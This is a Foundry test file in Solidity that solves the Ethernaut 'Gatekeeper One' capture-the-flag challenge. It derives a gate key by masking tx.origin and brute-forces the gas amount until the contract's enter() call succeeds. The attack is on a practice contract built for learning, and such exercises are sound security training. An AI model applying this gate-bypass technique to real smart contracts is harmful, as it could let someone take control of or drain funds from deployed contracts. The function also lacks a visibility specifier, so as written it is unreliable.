// SPDX-License-Identifier: Unlicense
pragma solidity 0.8.17;

import "forge-std/Test.sol";
import "ethernaut/Gatekeeper1.sol";



contract ContractTest is Test {

    GatekeeperOne gate = new GatekeeperOne();

    function testexploit(){
        bytes8 _gateKey = bytes8(uint64(tx.origin)) & 0xFFFFFFFF0000FFFF;
        for (uint256 i = 0; i < 300; i++) {
            (bool success, ) = address(gate).call{gas: i + (9000 * 3)}(abi.encodeWithSignature("enter(bytes8)", _gateKey));
            if (success) {
                break;
            }
        }
    }
}